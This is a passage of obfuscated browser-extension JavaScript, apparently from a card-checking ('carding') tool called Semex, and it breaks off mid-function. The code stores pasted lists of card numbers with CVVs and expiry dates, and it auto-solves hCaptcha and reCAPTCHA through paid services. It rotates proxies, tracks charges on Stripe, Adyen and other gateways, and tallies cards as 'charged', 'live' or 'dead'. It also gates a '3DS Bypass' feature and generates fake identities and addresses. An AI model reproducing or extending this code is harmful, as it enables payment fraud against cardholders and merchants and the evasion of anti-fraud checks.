    await setSetting("binOrCCList.cvv", _0x1e2466.target.value.trim());
  });
  document.getElementById("cc-list-input").addEventListener("change", async _0x54c245 => {
    await setSetting("binOrCCList.ccList", _0x54c245.target.value.trim());
    updateCCListCounter();
    checkCardReplacementWarning();
  });
  document.getElementById("cc-list-input").addEventListener("input", e => {
    updateCCListCounter();
    checkCardReplacementWarning();
    // Mobile paste fallback: many mobile browsers (Kiwi / Yandex / Chrome Android)
    // fire an `input` event with inputType "insertFromPaste" instead of a usable
    // `paste` event, so the paste-time cleaners never run and cards stay unformatted.
    // Re-run the smart cleaner ~30ms later (AFTER the desktop paste handler at 20ms)
    // so desktop stays single-clean while mobile gets cleaned too.
    const it = e && e.inputType;
    if (it === "insertFromPaste" || it === "insertReplacementText") {
      const ta = e.target;
      clearTimeout(ta.__semexMobilePasteT);
      ta.__semexMobilePasteT = setTimeout(async () => {
        const cur = ta.value || "";
        const cleaner = window.semexSmartCardCleaner || cleanCCListOnPaste;
        let cleaned;
        try {
          cleaned = cleaner(cur);
        } catch (err) {
          return;
        }
        if (cleaned && cleaned !== cur) {
          ta.value = cleaned;
          await setSetting("binOrCCList.ccList", cleaned);
          updateCCListCounter();
          if (typeof showToast === "function") {
            const n = cleaned.split("\n").filter(Boolean).length;
            showToast("Cleaned " + n + " card" + (n === 1 ? "" : "s") + " ✨", "success");
          }
        }
      }, 30);
    }
  });
  document.getElementById("cc-list-input").addEventListener("paste", _0x97b635 => {
    setTimeout(async () => {
      const _0x3d23df = document.getElementById("cc-list-input");
      const _0x2fb47d = _0x3d23df.value;
      const _0x11bcb4 = cleanCCListOnPaste(_0x2fb47d);
      if (_0x11bcb4 !== _0x2fb47d) {
        _0x3d23df.value = _0x11bcb4;
        await setSetting("binOrCCList.ccList", _0x11bcb4);
        const _0x3392b0 = _0x11bcb4.split("\n").filter(_0x3ef870 => _0x3ef870.trim()).length;
      }
      updateCCListCounter();
    }, 10);
  });
  document.getElementById("expiry-month-select").addEventListener("change", async _0x4453d8 => {
    await setSetting("binOrCCList.expiry.month", _0x4453d8.target.value);
  });
  document.getElementById("expiry-year-select").addEventListener("change", async _0x18ceab => {
    await setSetting("binOrCCList.expiry.year", _0x18ceab.target.value);
  });
  document.getElementById("captcha-solving-toggle").addEventListener("change", async _0x30c387 => {
    var _0x3dd921;
    var _0x489970;
    await setSetting("captchaSolving.enabled", _0x30c387.target.checked);
    toggleSectionContent("captcha-solving-content", _0x30c387.target.checked);
    if (_0x30c387.target.checked) {
      const _0x3e5850 = await getSettings();
      if (!((_0x3dd921 = _0x3e5850.captchaSolving) == null ? undefined : _0x3dd921.hCaptcha)) {
        await setSetting("captchaSolving.hCaptcha", {
          enabled: true,
          tapBased: true,
          fallbackToManual: true
        });
      }
      if (!((_0x489970 = _0x3e5850.captchaSolving) == null ? undefined : _0x489970.recaptcha)) {
        await setSetting("captchaSolving.recaptcha", {
          enabled: false,
          auto_open: true,
          auto_solve: true
        });
      }
    }
  });
  document.getElementById("nopecha-api-key").addEventListener("change", async _0x53eb4e => {
    await setSetting("captchaSolving.api_key", _0x53eb4e.target.value.trim());
    updateNopechaStatus();
  });
  try {
    const _provEl = document.getElementById("captcha-provider");
    if (_provEl) _provEl.addEventListener("change", async ev => {
      await setSetting("captchaSolving.provider", ev.target.value);
    });
  } catch (_e) {}
  document.getElementById("hcaptcha-enabled").addEventListener("change", async _0x2b2772 => {
    await setSetting("captchaSolving.hCaptcha.enabled", _0x2b2772.target.checked);
    toggleSectionContent("hcaptcha-content", _0x2b2772.target.checked);
  });
  document.getElementById("hcaptcha-tap-based").addEventListener("change", async _0x29355d => {
    await setSetting("captchaSolving.hCaptcha.tapBased", _0x29355d.target.checked);
  });
  try {
    const _h2cEl = document.getElementById("hcaptcha-2captcha");
    if (_h2cEl) _h2cEl.addEventListener("change", async ev => {
      await setSetting("captchaSolving.hCaptcha.use2Captcha", ev.target.checked);
    });
  } catch (_e) {}
  document.getElementById("hcaptcha-fallback-manual").addEventListener("change", async _0x41ef49 => {
    await setSetting("captchaSolving.hCaptcha.fallbackToManual", _0x41ef49.target.checked);
  });
  document.getElementById("recaptcha-enabled").addEventListener("change", async _0x47b1d5 => {
    await setSetting("captchaSolving.recaptcha.enabled", _0x47b1d5.target.checked);
    toggleSectionContent("recaptcha-content", _0x47b1d5.target.checked);
  });
  document.getElementById("recaptcha-auto-open").addEventListener("change", async _0x303f90 => {
    await setSetting("captchaSolving.recaptcha.auto_open", _0x303f90.target.checked);
  });
  document.getElementById("recaptcha-auto-solve").addEventListener("change", async _0x1aecee => {
    await setSetting("captchaSolving.recaptcha.auto_solve", _0x1aecee.target.checked);
  });
  document.getElementById("proxy-rotation-toggle").addEventListener("change", async _0x386dc7 => {
    await setSetting("proxyManagement.enabled", _0x386dc7.target.checked);
    toggleSectionContent("rotation-settings", _0x386dc7.target.checked);
  });
  document.getElementById("auto-save-live").addEventListener("change", async _0x139ac1 => {
    await setSetting("proxyManagement.autoSaveLive", _0x139ac1.target.checked);
  });
  document.getElementById("rotation-mode").addEventListener("change", async _0x217e58 => {
    await setSetting("proxyManagement.rotationMode", _0x217e58.target.value);
  });
  document.getElementById("rotation-interval").addEventListener("change", async _0x1f2526 => {
    await setSetting("proxyManagement.rotationInterval", parseInt(_0x1f2526.target.value) || 5);
  });
  document.getElementById("payment-tracking-toggle").addEventListener("change", async _0x4766f2 => {
    await setSetting("paymentTracking.enabled", _0x4766f2.target.checked);
    toggleSectionContent("payment-tracking-content", _0x4766f2.target.checked);
  });
  document.getElementById("pt-stripe").addEventListener("change", async _0x1b2a0e => {
    await setSetting("paymentTracking.gateways.stripe", _0x1b2a0e.target.checked);
  });
  document.getElementById("pt-adyen").addEventListener("change", async _0x498653 => {
    await setSetting("paymentTracking.gateways.adyen", _0x498653.target.checked);
  });
  document.getElementById("pt-checkout").addEventListener("change", async _0x38c358 => {
    await setSetting("paymentTracking.gateways.checkout", _0x38c358.target.checked);
  });
  document.getElementById("pt-recurly").addEventListener("change", async _0x2ba607 => {
    await setSetting("paymentTracking.gateways.recurly", _0x2ba607.target.checked);
  });
  document.getElementById("pt-xsolla").addEventListener("change", async _0x4c7aa6 => {
    await setSetting("paymentTracking.gateways.xsolla", _0x4c7aa6.target.checked);
  });
  document.getElementById("pt-show-toast").addEventListener("change", async _0x20f6d8 => {
    await setSetting("paymentTracking.showToast", _0x20f6d8.target.checked);
  });
  document.getElementById("pt-only-success").addEventListener("change", async _0x3f50ac => {
    await setSetting("paymentTracking.onlySuccess", _0x3f50ac.target.checked);
  });
  document.getElementById("pt-dismiss-time").addEventListener("change", async _0x1aa01b => {
    await setSetting("paymentTracking.dismissTime", parseInt(_0x1aa01b.target.value) || 5);
  });
  document.getElementById("form-filling-toggle").addEventListener("change", async _0x51f89a => {
    await setSetting("formFilling.enabled", _0x51f89a.target.checked);
  });
  document.getElementById("form-filling-custom-email").addEventListener("change", async _0xa2aa08 => {
    await setSetting("formFilling.customEmail", _0xa2aa08.target.value.trim());
  });
  document.getElementById("form-filling-random-email").addEventListener("change", async _0x1cc513 => {
    await setSetting("formFilling.randomEmail", _0x1cc513.target.checked);
    document.getElementById("form-filling-custom-email").disabled = _0x1cc513.target.checked;
  });
  document.getElementById("form-filling-custom-name").addEventListener("change", async _0xf70b1c => {
    await setSetting("formFilling.customName", _0xf70b1c.target.value.trim());
  });
  document.getElementById("form-filling-random-name").addEventListener("change", async _0x3b281d => {
    await setSetting("formFilling.randomName", _0x3b281d.target.checked);
    document.getElementById("form-filling-custom-name").disabled = _0x3b281d.target.checked;
  });
  document.getElementById("screenshot-save-locally").addEventListener("change", async _0x3251b9 => {
    await setSetting("screenshot.saveLocally", _0x3251b9.target.checked);
  });
  const _celConfBtn = document.getElementById("celebration-confetti");
  if (_celConfBtn) _celConfBtn.addEventListener("change", async e => { await setSetting("celebration.confetti", e.target.checked); });
  const _celSoundBtn = document.getElementById("celebration-sound");
  if (_celSoundBtn) _celSoundBtn.addEventListener("change", async e => { await setSetting("celebration.sound", e.target.checked); });
  const _celVolBtn = document.getElementById("celebration-volume");
  const _celVolLabel = document.getElementById("celebration-volume-value");
  if (_celVolBtn) {
    _celVolBtn.addEventListener("input", e => { if (_celVolLabel) _celVolLabel.textContent = e.target.value + "%"; });
    _celVolBtn.addEventListener("change", async e => { await setSetting("celebration.volume", parseInt(e.target.value, 10)); });
  }
  document.getElementById("address-follow-proxy").addEventListener("change", async _0x263f09 => {
    await setSetting("addressFollowProxy", _0x263f09.target.checked);
  });
  const _0x136d61 = document.getElementById("address-country-select");
  const _0x1fdfad = document.getElementById("address-country-custom");
  _0x136d61.addEventListener("change", async _0x480db8 => {
    if (_0x480db8.target.value === "CUSTOM") {
      _0x1fdfad.style.display = "block";
      _0x1fdfad.focus();
    } else {
      _0x1fdfad.style.display = "none";
      await setSetting("addressCountry", _0x480db8.target.value);
    }
  });
  _0x1fdfad.addEventListener("change", async _0x144e8c => {
    const _0x8245b9 = _0x144e8c.target.value.toUpperCase().trim();
    if (_0x8245b9.length === 2) {
      await setSetting("addressCountry", _0x8245b9);
    }
  });
  document.getElementById("address-country-random").addEventListener("change", async _0x586b26 => {
    await setSetting("addressCountryRandom", _0x586b26.target.checked);
  });
  if ((_0x54f311 = document.getElementById("reset-stats-btn")) == null) {
    undefined;
  } else {
    _0x54f311.addEventListener("click", async () => {
      showConfirmModal("Reset Statistics", "Are you sure you want to reset all payment tracking statistics? This action cannot be undone.", async () => {
        await chrome.storage.local.set({
          statistics: {
            totalCards: 0,
            charged: 0,
            ccnLive: 0,
            dead: 0
          }
        });
        document.getElementById("total-cards").textContent = "0";
        document.getElementById("stats-charged").textContent = "0";
        document.getElementById("stats-ccn").textContent = "0";
        document.getElementById("stats-dead").textContent = "0";
        showToast("✅ Statistics reset successfully", "success", 2000);
      });
    });
  }
}
__name(setupSettingsListeners, "setupSettingsListeners");
function showConfirmModal(_0x2fb719, _0x14bc20, _0x1bc769 = "OK") {
  const _0x4cc55b = document.getElementById("confirm-modal-overlay");
  const _0x3e07c7 = document.getElementById("confirm-modal-title");
  const _0x4be167 = document.getElementById("confirm-modal-message");
  const _0x3956ce = document.getElementById("confirm-modal-ok");
  const _0x50174b = document.getElementById("confirm-modal-cancel");
  const _0x2fb90a = document.getElementById("confirm-modal-close");
  if (!_0x4cc55b || !_0x3e07c7 || !_0x4be167 || !_0x3956ce || !_0x50174b) {
    if (typeof _0x1bc769 === "function") {
      if (confirm(_0x2fb719 + "\n\n" + _0x14bc20)) {
        _0x1bc769();
      }
      return;
    } else {
      return Promise.resolve(confirm(_0x2fb719 + "\n\n" + _0x14bc20));
    }
  }
  const _0x5ea4e7 = typeof _0x1bc769 === "function";
  const _0x1c4666 = _0x5ea4e7 ? _0x1bc769 : null;
  const _0x4d40bc = _0x5ea4e7 ? "OK" : _0x1bc769;
  _0x3e07c7.textContent = _0x2fb719;
  _0x4be167.textContent = _0x14bc20;
  _0x3956ce.textContent = _0x4d40bc;
  _0x4cc55b.classList.remove("hidden");
  _0x4cc55b.style.display = "flex";
  const _0x17e966 = _0x3956ce.cloneNode(true);
  const _0x5190f1 = _0x50174b.cloneNode(true);
  const _0x482f6c = _0x2fb90a == null ? undefined : _0x2fb90a.cloneNode(true);
  _0x3956ce.parentNode.replaceChild(_0x17e966, _0x3956ce);
  _0x50174b.parentNode.replaceChild(_0x5190f1, _0x50174b);
  if (_0x2fb90a && _0x482f6c) {
    _0x2fb90a.parentNode.replaceChild(_0x482f6c, _0x2fb90a);
  }
  const _0x2140ee = __name(() => {
    _0x4cc55b.classList.add("hidden");
    _0x4cc55b.style.display = "none";
  }, "hideModal");
  if (_0x5ea4e7) {
    _0x17e966.addEventListener("click", () => {
      _0x2140ee();
      if (_0x1c4666) {
        _0x1c4666();
      }
    });
    _0x5190f1.addEventListener("click", _0x2140ee);
    if (_0x482f6c) {
      _0x482f6c.addEventListener("click", _0x2140ee);
    }
    const _0x3e0dba = __name(_0x5b7651 => {
      if (_0x5b7651.target === _0x4cc55b) {
        _0x2140ee();
        _0x4cc55b.removeEventListener("click", _0x3e0dba);
      }
    }, "outsideClickHandler");
    _0x4cc55b.addEventListener("click", _0x3e0dba);
    return;
  }
  return new Promise(_0x542f40 => {
    const _0x29f572 = __name(() => {
      _0x2140ee();
      _0x542f40(true);
    }, "handleConfirm");
    const _0x21fc36 = __name(() => {
      _0x2140ee();
      _0x542f40(false);
    }, "handleCancel");
    _0x17e966.addEventListener("click", _0x29f572);
    _0x5190f1.addEventListener("click", _0x21fc36);
    if (_0x482f6c) {
      _0x482f6c.addEventListener("click", _0x21fc36);
    }
    const _0x4ac6f9 = __name(_0x201683 => {
      if (_0x201683.target === _0x4cc55b) {
        _0x21fc36();
        _0x4cc55b.removeEventListener("click", _0x4ac6f9);
      }
    }, "outsideClickHandler");
    _0x4cc55b.addEventListener("click", _0x4ac6f9);
  });
}
__name(showConfirmModal, "showConfirmModal");
async function checkLoginStatus() {
  const _0x164880 = document.getElementById("auth-modal");
  if (window.cacheManager) {
    try {
      const _0x3f2224 = await window.cacheManager.get("user_profile", {
        strategy: "local"
      });
      if (_0x3f2224) {
        updateUserInfo(_0x3f2224);
      }
    } catch (_0x56e880) {}
  }
  const _0xf970a2 = await window.serverClient.verifySession();
  if (_0xf970a2 && _0xf970a2.valid) {
    localStorage.setItem("semex_logged_in", "true");
    _0x164880.classList.remove("active");
    await chrome.storage.session.remove(["__xotpid"]);
    updateUserInfo(_0xf970a2);
    // Cache the plan + admin flag for premium-gate checks (3DS Bypass, etc.)
    try {
      window._semexUserPlan = _0xf970a2.plan || "";
      window._semexIsAdmin = !!_0xf970a2.isAdmin;
      _semexApplyPremiumGates();
    } catch (_e) {}
    if (window.cacheManager) {
      try {
        await window.cacheManager.set("user_profile", {
          telegramId: _0xf970a2.telegramId,
          firstName: _0xf970a2.firstName,
          name: _0xf970a2.name,
          username: _0xf970a2.username,
          photoUrl: _0xf970a2.photoUrl,
          photoFileId: _0xf970a2.photoFileId,
          plan: _0xf970a2.plan,
          isAdmin: _0xf970a2.isAdmin,
          is_banned: _0xf970a2.is_banned,
          status: _0xf970a2.status
        }, {
          strategy: "local",
          ttl: 86400000
        });
      } catch (_0x5785b7) {}
      try {
        await window.cacheManager.set("user_status", {
          plan: _0xf970a2.plan,
          is_banned: _0xf970a2.is_banned,
          isAdmin: _0xf970a2.isAdmin,
          status: _0xf970a2.status,
          expiresAt: _0xf970a2.expiresAt
        }, {
          strategy: "session",
          ttl: 1800000
        });
      } catch (_0x19a729) {}
    }
  } else {
    localStorage.removeItem("semex_logged_in");
    if (window.cacheManager) {
      try {
        await window.cacheManager.invalidate("user_profile", "local");
      } catch (_0xbd0033) {}
    }
    _0x164880.classList.add("active");
    const _0x1c57a9 = await chrome.storage.session.get("__xotpid");
    if (_0x1c57a9.otpPendingTelegramId) {
      document.getElementById("auth-telegram-id").value = _0x1c57a9.otpPendingTelegramId;
      document.getElementById("auth-step-1").classList.add("hidden");
      document.getElementById("auth-step-2").classList.remove("hidden");
    }
  }
}
__name(checkLoginStatus, "checkLoginStatus");
function setupAuthListeners() {
  const _0xc410c7 = document.getElementById("auth-btn-send");
  if (_0xc410c7) {
    _0xc410c7.addEventListener("click", async () => {
      const _0xdde83d = document.getElementById("auth-telegram-id").value.trim();
      if (!_0xdde83d) {
        showHistoryToast("Please enter Telegram ID");
        return;
      }
      _0xc410c7.innerText = "Sending...";
      _0xc410c7.disabled = true;
      const _0x282922 = await window.serverClient.requestOTP(_0xdde83d);
      if (_0x282922.success) {
        await chrome.storage.session.set({
          __xotpid: _0xdde83d
        });
        document.getElementById("auth-step-1").classList.add("hidden");
        document.getElementById("auth-step-2").classList.remove("hidden");
        document.getElementById("auth-otp").focus();
        if (_0x282922.pending) {
          showHistoryToast("📱 Check Telegram to confirm login!");
        }
      } else {
        let _0xfdf142 = _0x282922.error || "Failed to send OTP";
        if (_0xfdf142.includes("Too many") || _0xfdf142.includes("wait")) {
          const _0x77968c = _0x282922.retryAfter || 60;
          if (_0x77968c >= 60) {
            const _0x2b25c5 = Math.ceil(_0x77968c / 60);
            _0xfdf142 = "Please wait " + _0x2b25c5 + " minute" + (_0x2b25c5 > 1 ? "s" : "") + " before requesting another OTP.";
          } else {
            _0xfdf142 = "Please wait " + _0x77968c + " seconds before requesting another OTP.";
          }
        } else if (_0xfdf142.includes("registration") || _0xfdf142.includes("closed")) {
          _0xfdf142 = "Registration is currently closed. Please contact admin.";
        }
        alert(_0xfdf142);
        _0xc410c7.innerText = "Send OTP";
        _0xc410c7.disabled = false;
      }
    });
  }
  const _0x2d66d0 = document.getElementById("auth-btn-verify");
  if (_0x2d66d0) {
    _0x2d66d0.addEventListener("click", async () => {
      const _0x230d62 = document.getElementById("auth-telegram-id").value.trim();
      const _0x18e8b0 = document.getElementById("auth-otp").value.trim();
      if (!_0x18e8b0) {
        showHistoryToast("Enter OTP");
        return;
      }
      _0x2d66d0.innerText = "Verifying...";
      _0x2d66d0.disabled = true;
      const _0x86eac7 = await window.serverClient.verifyOTP(_0x230d62, _0x18e8b0);
      if (_0x86eac7.success) {
        await chrome.storage.session.remove(["__xotpid"]);
        await chrome.storage.session.remove("__xcabuf");
        document.getElementById("auth-modal").classList.remove("active");
        updateUserInfo(_0x86eac7.user);
      } else {
        alert("Login Failed: " + (_0x86eac7.error || "Invalid OTP"));
        _0x2d66d0.innerText = "Verify & Login";
        _0x2d66d0.disabled = false;
      }
    });
  }
  const _0x220df3 = document.getElementById("auth-link-back");
  if (_0x220df3) {
    _0x220df3.addEventListener("click", async _0x5b6dec => {
      _0x5b6dec.preventDefault();
      await chrome.storage.session.remove(["__xotpid"]);
      document.getElementById("auth-step-2").classList.add("hidden");
      document.getElementById("auth-step-1").classList.remove("hidden");
      document.getElementById("auth-btn-send").innerText = "Send OTP";
      document.getElementById("auth-btn-send").disabled = false;
    });
  }
  const _0x1611be = document.getElementById("logout-btn");
  if (_0x1611be) {
    _0x1611be.addEventListener("click", async () => {
      var _0xd247b4;
      var _0x524c1f;
      const _0x16ee31 = await showConfirmModal("Logout", "Are you sure you want to logout?", "Logout");
      if (_0x16ee31) {
        if (window.localStorage) {
          window.localStorage.removeItem("fingerprint");
        }
        await chrome.storage.local.remove("fingerprint");
        await chrome.storage.session.remove(["__xotpid"]);
        await chrome.storage.session.remove("__xcabuf");
        if (window.serverClient) {
          window.serverClient.fingerprint = null;
        }
        const _0x354c44 = document.getElementById("user-badge");
        if (_0x354c44) {
          _0x354c44.classList.add("hidden");
        }
        const _0x5ce9c2 = document.getElementById("auth-modal");
        if (_0x5ce9c2) {
          _0x5ce9c2.classList.add("active");
        }
        if ((_0xd247b4 = document.getElementById("auth-step-2")) == null) {
          undefined;
        } else {
          _0xd247b4.classList.add("hidden");
        }
        if ((_0x524c1f = document.getElementById("auth-step-1")) == null) {
          undefined;
        } else {
          _0x524c1f.classList.remove("hidden");
        }
        document.getElementById("auth-btn-send").innerText = "Send OTP";
        document.getElementById("auth-btn-send").disabled = false;
        document.getElementById("auth-telegram-id").value = "";
        document.getElementById("auth-otp").value = "";
      }
    });
  }
}
__name(setupAuthListeners, "setupAuthListeners");
function updateUserInfo(_0x4714fb) {
  var _0xda8405;
  const _0x238447 = document.getElementById("user-badge");
  const _0xcfbfb0 = document.getElementById("user-avatar");
  const _0x1dee25 = document.getElementById("user-name");
  const _0x318335 = document.getElementById("user-plan");
  if (!_0x238447 || !_0x4714fb) {
    if (_0x238447) {
      hideElement(_0x238447);
    }
    return;
  }
  showElement(_0x238447, "flex");
  if (_0x4714fb.photoFileId) {
    const _0x5d085f = ((_0xda8405 = window.serverClient) == null ? undefined : _0xda8405.baseUrl) || "http://localhost:3000";
    const _0x1b6922 = _0x5d085f + "/api/auth/photo/" + _0x4714fb.photoFileId;
    _0xcfbfb0.style.background = "linear-gradient(135deg, #3B82F6, #8B5CF6, #EC4899)";
    const _0x5addfa = new Image();
    _0x5addfa.onload = () => {
      _0xcfbfb0.src = _0x1b6922;
      _0xcfbfb0.style.background = "none";
    };
    _0x5addfa.onerror = () => {
      _0xcfbfb0.src = "";
      _0xcfbfb0.style.background = "linear-gradient(135deg, #3B82F6, #8B5CF6, #EC4899)";
    };
    _0x5addfa.src = _0x1b6922;
  } else {
    _0xcfbfb0.src = "../icons/logo.png";
    _0xcfbfb0.style.background = "linear-gradient(135deg, #3B82F6, #8B5CF6, #EC4899)";
  }
  const _0x488a1b = _0x4714fb.firstName || _0x4714fb.name || _0x4714fb.username || "User";
  _0x1dee25.textContent = _0x488a1b;
  const _0x16e071 = document.getElementById("user-badge-container");
  const _0x2b82d1 = document.getElementById("tooltip-username");
  if (_0x16e071) {
    _0x16e071.title = _0x488a1b;
  }
  if (_0x2b82d1) {
    if (_0x4714fb.username) {
      _0x2b82d1.textContent = "@" + _0x4714fb.username;
    } else {
      _0x2b82d1.textContent = _0x488a1b;
    }
  }
  let _0x43992d = "FREE";
  let _0x1fa2cc = "free";
  const _0x7489f3 = (_0x4714fb.plan || "free").toLowerCase();
  if (_0x4714fb.is_banned || _0x4714fb.status === "banned" || _0x7489f3 === "*dead*") {
    _0x43992d = "BANNED";
    _0x1fa2cc = "banned";
  } else if (_0x4714fb.isAdmin || _0x7489f3 === "vip") {
    _0x43992d = _0x4714fb.isAdmin ? "ADMIN" : "VIP ⭐";
    _0x1fa2cc = "admin";
  } else if (_0x7489f3 === "yearly") {
    _0x43992d = "YEARLY ⭐";
    _0x1fa2cc = "premium";
  } else if (_0x7489f3 === "monthly") {
    _0x43992d = "MONTHLY";
    _0x1fa2cc = "premium";
  } else if (_0x7489f3 === "plus") {
    _0x43992d = "PLUS";
    _0x1fa2cc = "paid";
  } else if (_0x7489f3 === "weekly") {
    _0x43992d = "WEEKLY";
    _0x1fa2cc = "paid";
  } else if (_0x7489f3 === "trial") {
    _0x43992d = "TRIAL";
    _0x1fa2cc = "free";
  } else if (_0x7489f3 === "paid") {
    _0x43992d = "PAID ⭐";
    _0x1fa2cc = "paid";
  } else if (_0x7489f3 === "premium" || _0x7489f3 === "pro") {
    _0x43992d = "PREMIUM";
    _0x1fa2cc = "premium";
  } else if (_0x7489f3 === "lifetime") {
    _0x43992d = "LIFETIME";
    _0x1fa2cc = "lifetime";
  } else {
    _0x43992d = "FREE";
    _0x1fa2cc = "free";
  }
  _0x318335.textContent = _0x43992d;
  _0x318335.className = "plan-badge " + _0x1fa2cc;

  // Reveal / hide Admin tab — v2.9.5: OWNER ONLY. Promoted admins no longer
  // see the admin dashboard or live feed. Ownership is confirmed server-side
  // once per session (the is-owner endpoint is admin-reachable) and cached.
  const _navAdmin = document.getElementById("nav-admin");
  if (_navAdmin) {
    if (_0x4714fb.isAdmin && window._semexIsOwner == null) {
      (async () => {
        try {
          const _ownResp = await window.serverClient.authedFetch("/api/admin/is-owner");
          const _ownData = _ownResp.ok ? await _ownResp.json() : {};
          window._semexIsOwner = !!(_ownData && (_ownData.isOwner || _ownData.is_owner));
        } catch (_eOwn) {
          window._semexIsOwner = false;
        }
        if (window._semexIsOwner) {
          const _navLate = document.getElementById("nav-admin");
          if (_navLate) _navLate.classList.remove("hidden");
        }
      })();
    }
    if (_0x4714fb.isAdmin && window._semexIsOwner === true) {
      _navAdmin.classList.remove("hidden");
    } else {
      _navAdmin.classList.add("hidden");
      // If they were viewing the admin tab, kick them back to bypass
      const _adminPanel = document.getElementById("admin-tab");
      if (_adminPanel && _adminPanel.classList.contains("active")) {
        _adminPanel.classList.remove("active");
        _navAdmin.classList.remove("active");
        const _bypassTab = document.getElementById("bypass-tab");
        const _bypassNav = document.querySelector('.tab[data-tab="bypass"]');
        if (_bypassTab) _bypassTab.classList.add("active");
        if (_bypassNav) _bypassNav.classList.add("active");
      }
    }
  }
}
__name(updateUserInfo, "updateUserInfo");
function setupGenerators() {
  const _0x4bf5e6 = document.getElementById("generate-address-btn");
  if (_0x4bf5e6) {
    _0x4bf5e6.addEventListener("click", async () => {
      _0x4bf5e6.innerText = "Generating...";
      _0x4bf5e6.disabled = true;
      const _0x967c8e = document.getElementById("address-country-select");
      const _0x4c64fd = document.getElementById("address-country-custom");
      const _0x3720a6 = document.getElementById("address-country-random");
      let _0xae9859 = _0x967c8e.value;
      const _0x2c61dc = (_0x3720a6 == null ? undefined : _0x3720a6.checked) || _0xae9859 === "RANDOM";
      if (_0xae9859 === "CUSTOM") {
        _0xae9859 = _0x4c64fd.value.toUpperCase().trim() || "US";
      }
      const _0x384785 = await window.serverClient.getAddress(_0xae9859, _0x2c61dc);
      const _0x900ba4 = document.getElementById("address-result");
      if (_0x384785 && !_0x384785.error) {
        _0x900ba4.innerHTML = formatObjectToHtml(_0x384785);
        _0x900ba4.classList.remove("hidden");
      } else {
        _0x900ba4.innerText = (_0x384785 == null ? undefined : _0x384785.error) || "Failed to generate address";
      }
      _0x4bf5e6.innerText = "Generate Address";
      _0x4bf5e6.disabled = false;
    });
  }
  const _0xfff567 = document.getElementById("generate-user-btn");
  if (_0xfff567) {
    _0xfff567.addEventListener("click", async () => {
      _0xfff567.innerText = "Generating...";
      _0xfff567.disabled = true;
      const _0x729352 = await window.serverClient.getUser();
      const _0x5c9ab7 = document.getElementById("user-result");
      if (_0x729352 && !_0x729352.error) {
        _0x5c9ab7.innerHTML = formatObjectToHtml(_0x729352);
        _0x5c9ab7.classList.remove("hidden");
      } else {
        _0x5c9ab7.innerText = (_0x729352 == null ? undefined : _0x729352.error) ? "Authentication required" : "Failed to generate user";
      }
      _0xfff567.innerText = "Generate User";
      _0xfff567.disabled = false;
    });
  }
}
__name(setupGenerators, "setupGenerators");
function formatObjectToHtml(_0x297a2c) {
  return Object.entries(_0x297a2c).map(([_0x56ea97, _0x36662d]) => "<div class=\"result-row\" data-copy=\"" + escapeHtml(String(_0x36662d)) + "\" title=\"Click to copy\">\n            <span class=\"result-label\">" + escapeHtml(_0x56ea97) + ":</span>\n            <span class=\"result-value\">" + escapeHtml(String(_0x36662d)) + "</span>\n         </div>").join("");
}
__name(formatObjectToHtml, "formatObjectToHtml");
document.addEventListener("click", _0x4f1998 => {
  const _0x12e341 = _0x4f1998.target.closest(".result-row[data-copy]");
  if (_0x12e341) {
    const _0x3d479a = _0x12e341.getAttribute("data-copy");
    navigator.clipboard.writeText(_0x3d479a).then(() => {
      showToast("📋 Copied!", "success", 1500);
    }).catch(_0x451662 => {});
  }
});
function showToast(_0x2ab04f, _0x12bf6b = "info", _0x3455ad = 3000) {
  const _0x10fdf2 = document.querySelector(".popup-toast");
  if (_0x10fdf2) {
    _0x10fdf2.remove();
  }
  const _0x2f4e2c = document.createElement("div");
  _0x2f4e2c.className = "popup-toast popup-toast-" + _0x12bf6b;
  _0x2f4e2c.textContent = _0x2ab04f;
  _0x2f4e2c.style.cssText = "\n        position: fixed;\n        bottom: 20px;\n        left: 50%;\n        transform: translateX(-50%);\n        background: " + (_0x12bf6b === "success" ? "#10b981" : _0x12bf6b === "error" ? "#ef4444" : "#667eea") + ";\n        color: white;\n        padding: 10px 20px;\n        border-radius: 8px;\n        font-size: 13px;\n        z-index: 10000;\n        box-shadow: 0 4px 12px rgba(0,0,0,0.3);\n        animation: fadeIn 0.2s ease;\n    ";
  document.body.appendChild(_0x2f4e2c);
  setTimeout(() => {
    _0x2f4e2c.style.animation = "fadeOut 0.2s ease";
    setTimeout(() => _0x2f4e2c.remove(), 200);
  }, _0x3455ad);
}
__name(showToast, "showToast");
function showStatus(_0x4c663a, _0x30c397) {
  const _0x4ccb36 = document.getElementById("extension-status");
  if (_0x4ccb36) {
    _0x4ccb36.classList.remove("hidden");
    _0x4ccb36.querySelector("span:last-child").innerText = _0x4c663a;
    const _0x42f227 = _0x4ccb36.querySelector(".dot");
    if (_0x42f227) {
      _0x42f227.style.background = _0x30c397 === "active" ? "#4ade80" : "#ef4444";
      _0x42f227.style.boxShadow = _0x30c397 === "active" ? "0 0 10px rgba(74, 222, 128, 0.8)" : "0 0 10px rgba(239, 68, 68, 0.8)";
    }
  }
}
__name(showStatus, "showStatus");
function populateYearDropdown() {
  const _0x10e91a = document.getElementById("expiry-year-select");
  if (!_0x10e91a) {
    return;
  }
  const _0x4355f3 = new Date().getFullYear();
  const _0x37e854 = _0x4355f3 % 100;
  while (_0x10e91a.options.length > 1) {
    _0x10e91a.remove(1);
  }
  for (let _0x3e87fe = 0; _0x3e87fe < 12; _0x3e87fe++) {
    const _0x49483d = _0x37e854 + _0x3e87fe;
    const _0x404b3c = document.createElement("option");
    _0x404b3c.value = _0x49483d.toString().padStart(2, "0");
    _0x404b3c.textContent = _0x49483d.toString().padStart(2, "0");
    // v2.9.5: default to current year + 3 — the current year (e.g. 12/2026) is
    // too close and gateways reject/flag near-expiry dates.
    if (_0x3e87fe === 3) {
      _0x404b3c.selected = true;
    }
    _0x10e91a.appendChild(_0x404b3c);
  }
}
__name(populateYearDropdown, "populateYearDropdown");
function cleanCCListOnPaste(_0x29827a) {
  if (!_0x29827a || typeof _0x29827a !== "string") {
    return "";
  }
  const _0x32d4bd = _0x29827a.split("\n");
  const _0x1b15a2 = [];
  for (const _0x4bae41 of _0x32d4bd) {
    const _0x58d49b = _0x4bae41.trim();
    if (!_0x58d49b) {
      continue;
    }
    if (_0x58d49b.includes("|")) {
      const _0x46106c = _0x58d49b.split("|").map(_0x18c2a3 => _0x18c2a3.trim());
      if (_0x46106c.length >= 3) {
        const _0x47cc29 = _0x46106c[0].replace(/\D/g, "");
        if (_0x47cc29.length >= 13 && _0x47cc29.length <= 19) {
          const _0x462666 = _0x46106c[1].replace(/\D/g, "");
          const _0x2fb4e1 = _0x46106c[2].replace(/\D/g, "");
